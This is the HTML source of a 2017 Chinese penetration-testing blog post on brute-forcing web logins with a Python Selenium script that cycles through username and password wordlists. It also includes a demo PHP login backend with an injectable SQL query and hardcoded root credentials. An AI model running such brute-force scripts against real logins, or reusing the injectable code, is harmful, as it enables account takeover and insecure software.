@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>基于Seleinum的口令爆破应用 | sm0nk&#39;s blog</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="@序&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;渗透过程经常遇到登录界面的密码是加密处理的，有时加密算法为md5,有时候为目标系统自定义的算法，但基于已知算法的爆破还是比较成熟的， 常规的base64和md5都可以通过Burp完成爆破，能够在js看到算法的可以通过自定义脚本来完成。&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;但如果是未知加密算法，例如每次登录请求都有随机码作为盐值去加密校验">
+<meta name="keywords" content="seleinum">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于Seleinum的口令爆破应用">
+<meta property="og:url" content="http://yoursite.com/2017/11/27/基于Seleinum的口令爆破应用/index.html">
+<meta property="og:site_name" content="sm0nk&#39;s blog">
+<meta property="og:description" content="@序&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;渗透过程经常遇到登录界面的密码是加密处理的，有时加密算法为md5,有时候为目标系统自定义的算法，但基于已知算法的爆破还是比较成熟的， 常规的base64和md5都可以通过Burp完成爆破，能够在js看到算法的可以通过自定义脚本来完成。&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;但如果是未知加密算法，例如每次登录请求都有随机码作为盐值去加密校验">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2017/11/27/基于Seleinum的口令爆破应用/loginPage.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/11/27/基于Seleinum的口令爆破应用/CommSum.gif">
+<meta property="og:updated_time" content="2017-11-27T06:10:18.195Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="基于Seleinum的口令爆破应用">
+<meta name="twitter:description" content="@序&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;渗透过程经常遇到登录界面的密码是加密处理的，有时加密算法为md5,有时候为目标系统自定义的算法，但基于已知算法的爆破还是比较成熟的， 常规的base64和md5都可以通过Burp完成爆破，能够在js看到算法的可以通过自定义脚本来完成。&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;但如果是未知加密算法，例如每次登录请求都有随机码作为盐值去加密校验">
+<meta name="twitter:image" content="http://yoursite.com/2017/11/27/基于Seleinum的口令爆破应用/loginPage.jpg">
+  
+    <link rel="alternative" href="/atom.xml" title="sm0nk&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://p6.sinaimg.cn/3607464725/180/71341468803657">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  
+
+  <script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+  
+</head></html>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="/img/kongfu.gif" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">sm0nk</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/categories/攻防渗透/">攻防渗透</a></li>
+				        
+							<li><a href="/categories/编程之道/">编程之道</a></li>
+				        
+							<li><a href="/categories/归纳总结/">归纳总结</a></li>
+				        
+							<li><a href="/categories/认知独省/">认知独省</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="mail" target="_blank" href="mailto:sm0nk@qq.com" title="mail">mail</a>
+					        
+								<a class="weibo" target="_blank" href="http://weibo.com/shellr00t" title="weibo">weibo</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/SQL注入/" style="font-size: 10px;">SQL注入</a> <a href="/tags/blog/" style="font-size: 10px;">blog</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/pentest/" style="font-size: 10px;">pentest</a> <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/seleinum/" style="font-size: 10px;">seleinum</a> <a href="/tags/struts2/" style="font-size: 10px;">struts2</a> <a href="/tags/业务逻辑/" style="font-size: 10px;">业务逻辑</a> <a href="/tags/代理转发/" style="font-size: 10px;">代理转发</a> <a href="/tags/工控安全/" style="font-size: 10px;">工控安全</a> <a href="/tags/应急/" style="font-size: 20px;">应急</a> <a href="/tags/接口安全/" style="font-size: 10px;">接口安全</a> <a href="/tags/渗透/" style="font-size: 10px;">渗透</a> <a href="/tags/爆破/" style="font-size: 10px;">爆破</a> <a href="/tags/语言安全/" style="font-size: 10px;">语言安全</a> <a href="/tags/远程下载/" style="font-size: 10px;">远程下载</a>
+					</div>
+				</section>
+				
+				
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">sm0nk</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/kongfu.gif" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">sm0nk</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/categories/攻防渗透/">攻防渗透</a></li>
+		        
+					<li><a href="/categories/编程之道/">编程之道</a></li>
+		        
+					<li><a href="/categories/归纳总结/">归纳总结</a></li>
+		        
+					<li><a href="/categories/认知独省/">认知独省</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="mail" target="_blank" href="mailto:sm0nk@qq.com" title="mail">mail</a>
+			        
+						<a class="weibo" target="_blank" href="http://weibo.com/shellr00t" title="weibo">weibo</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-基于Seleinum的口令爆破应用" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/11/27/基于Seleinum的口令爆破应用/" class="article-date">
+  	<time datetime="2017-11-27T03:02:11.000Z" itemprop="datePublished">2017-11-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      基于Seleinum的口令爆破应用
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/seleinum/">seleinum</a></li></ul>
+	</div>
+
+        
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/编程之道/">编程之道</a>
+	</div>
+
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1><span id="序">@序</span></h1><p>&nbsp;&nbsp;&nbsp;&nbsp;渗透过程经常遇到登录界面的密码是加密处理的，有时加密算法为md5,有时候为目标系统自定义的算法，但基于已知算法的爆破还是比较成熟的， 常规的base64和md5都可以通过Burp完成爆破，能够在js看到算法的可以通过自定义脚本来完成。<br>&nbsp;&nbsp;&nbsp;&nbsp;但如果是未知加密算法，例如每次登录请求都有随机码作为盐值去加密校验密码是否正确，我们该如何Bypass，本篇主要讲解基于Seleinum的 python 脚本实现自动登录，完成暴力破解。<br><a id="more"></a></p>
+<h1><span id="代码demo">代码Demo</span></h1><p>&nbsp;&nbsp;&nbsp;&nbsp;本次代码模拟中，并没有针对加密算法单独去写js以及后台加密，主要体现这种自动化思路，他之所以可以绕过加密是因为模拟的就是正常用户的输入流程，加密校验是目标系统接收输入后的逻辑流。</p>
+<p>前台代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>sm0nk's Login Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">.something-semantic &#123;</span></span><br><span class="line"><span class="undefined">   display: table;</span></span><br><span class="line"><span class="undefined">   width: 100%;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.something-else-semantic &#123;</span></span><br><span class="line"><span class="undefined">   display: table-cell;</span></span><br><span class="line"><span class="undefined">   text-align: center;</span></span><br><span class="line"><span class="undefined">   vertical-align: middle;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"height:100%"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"something-semantic"</span> <span class="attr">style</span>=<span class="string">"height:100%"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"something-else-semantic"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"loginBack.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">                                用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"input1"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">                                密&amp;nbsp;&amp;nbsp;&amp;nbsp;码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"input2"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">id</span>=<span class="string">"but"</span> <span class="attr">name</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"登陆"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>后台代码<br>数据库：存在test数据库，有一张admin 表，字段为name,pass  值为test,123456 （仅DEMO演示）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$username = trim($_POST[<span class="string">'username'</span>]);</span><br><span class="line">$password = trim($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">$sql = <span class="string">"select * from admin where name = '$username' and pass = '$password'"</span>;</span><br><span class="line">$result=mysql_db_query(<span class="string">"test"</span>,$sql,$conn);</span><br><span class="line">$rows = mysql_fetch_assoc($result);</span><br><span class="line"><span class="keyword">if</span>($rows)&#123;</span><br><span class="line">  $SESSION[<span class="string">'is_login'</span>]=$rows[<span class="string">'username'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'#Login_success#'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  $is_login=<span class="string">''</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'###Login_faild###'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>登录界面<br><img src="loginPage.jpg" alt></p>
+<h1><span id="爆破脚本">爆破脚本</span></h1><p>python seleinum 脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cusLogin</span><span class="params">(u,p)</span>:</span></span><br><span class="line">    browser.get(<span class="string">'http://localhost/LoginDemo/logindemo.html'</span>)</span><br><span class="line">    browser.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">    elem=browser.find_element_by_id(<span class="string">"input1"</span>)</span><br><span class="line">    elem.send_keys(u)</span><br><span class="line">    elem=browser.find_element_by_id(<span class="string">"input2"</span>)</span><br><span class="line">    elem.send_keys(p)</span><br><span class="line">    elem=browser.find_element_by_id(<span class="string">"but"</span>)</span><br><span class="line">    <span class="comment">#print browser.current_window_handle</span></span><br><span class="line">    elem.click()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> browser.page_source:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'###'</span>,u,p,<span class="string">'###'</span>,<span class="string">'Login Success'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'LoginFaild'</span></span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'pass.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> fP:</span><br><span class="line">	    <span class="keyword">for</span> pass1 <span class="keyword">in</span> fP.readlines():</span><br><span class="line">	        p = pass1.strip()</span><br><span class="line">	        <span class="keyword">with</span> open(<span class="string">'user.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> fU:</span><br><span class="line">	            <span class="keyword">for</span> user1 <span class="keyword">in</span> fU.readlines():</span><br><span class="line">	                u = user1.strip()</span><br><span class="line">	                <span class="keyword">print</span> u,p,<span class="string">'test...'</span></span><br><span class="line">	                cusLogin(u,p)</span><br><span class="line">    browser.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
+<p>最终效果图<br><img src="CommSum.gif" alt></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/12/04/Web攻防之暴力破解-何足道版/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          Web攻防之暴力破解(何足道版)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/10/29/python-selenium-初探/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">python selenium 初探</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 sm0nk
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: true
+	}
+</script>
+<script src="/js/main.js"></script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
